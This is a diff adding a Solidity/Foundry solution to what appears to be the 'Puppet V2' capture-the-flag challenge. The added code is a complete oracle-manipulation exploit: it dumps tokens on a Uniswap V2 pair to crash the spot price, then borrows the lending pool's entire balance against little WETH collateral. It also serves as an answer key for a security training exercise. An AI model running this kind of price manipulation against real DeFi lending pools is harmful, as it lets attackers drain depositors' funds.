@@ -97,8 +97,50 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV2() public checkSolvedByPlayer {
+        function test_puppetV2() public checkSolvedByPlayer {
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);  // Starting token (DVT)
+        path[1] = address(weth);   // Ending token (WETH)
+
+         // Log the state before the exploit
+        console.log('---------- BEFORE ----------');
+        uint ethRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("DepositOfWETHRequired is: %s", ethRequired);  // How much ETH is needed to borrow the DVT
+        console.log("Player's eth balance is : %s", player.balance);  // The player's current ETH balance
+
+        // The attacker approves the Uniswap router to swap their tokens for WETH
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         
+        // The attacker swaps their DVT tokens for WETH on Uniswap
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,  // Amount of tokens to swap
+            0,                             // Minimum amount of ETH to receive (0 is a common tactic to ge any price)
+            path,                          // Path of the trade (DVT -> WETH)
+            address(player),               // The address to receive the ETH
+            block.timestamp * 2            // Expiry time for the transaction
+        );
+
+        // Log the state after the exploit
+        console.log('---------- AFTER ----------');
+        ethRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("DepositOfWETHRequired is: %s", ethRequired);  // The updated ETH requirement after the swap
+        console.log("Player's eth balance is : %s", player.balance);  // The player's new ETH balance after the swap
+
+        // The attacker makes sure their balance is now greater than the ETH required for borrowing DVT
+        require(player.balance > ethRequired);
+
+        // The attacker deposits the ETH required to the WETH contract
+        weth.deposit{value: ethRequired}();
+        
+        // The attacker approves the lending pool to use their WETH for borrowing
+        weth.approve(address(lendingPool), ethRequired);
+
+        // The attacker borrows the DVT tokens from the lending pool by providing WETH as collateral
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // The attacker transfers the stolen DVT tokens to a recovery address
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
